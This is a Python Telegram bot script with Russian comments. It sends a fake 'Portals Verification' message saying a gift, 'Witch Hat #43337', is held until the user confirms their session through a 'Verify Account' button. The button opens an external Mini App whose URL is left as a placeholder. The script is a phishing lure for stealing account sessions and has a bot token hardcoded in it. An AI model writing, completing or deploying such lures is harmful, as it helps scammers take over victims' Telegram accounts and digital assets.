import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ТОКЕН БОТА
TOKEN = "8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y"

# Ссылка на фото
PHOTO_URL = "https://i.postimg.cc/BPbTnkcs/IMG-4158.png"

# ССЫЛКА НА ТВОЙ MINI APP (ЗАМЕНИ НА СВОЮ!)
MINI_APP_URL = "https://твой-сайт.com"  # ← СЮДА ВСТАВЬ СВОЙ URL

# Функция для команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Кнопка ВЕДЕТ В MINI APP
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        f"🎩 *Portals Verification*\n\n"
        f"**Final Verification Required: Claim Your Gift**\n\n"
        f"Your scheduled delivery of *Witch Hat #43337* is tagged for last-mile review. "
        f"To preserve platform safety and block fraudulent claim attempts, confirming "
        f"your active session is required before the gift can be released.\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    # Отправляем фото с кнопкой
    await update.message.reply_photo(
        photo=PHOTO_URL,
        caption=message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Команда /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Бот для верификации*\n\n"
        "Нажми /start и затем 'Verify Account' для открытия Mini App",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    
    logger.info("Бот запущен...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()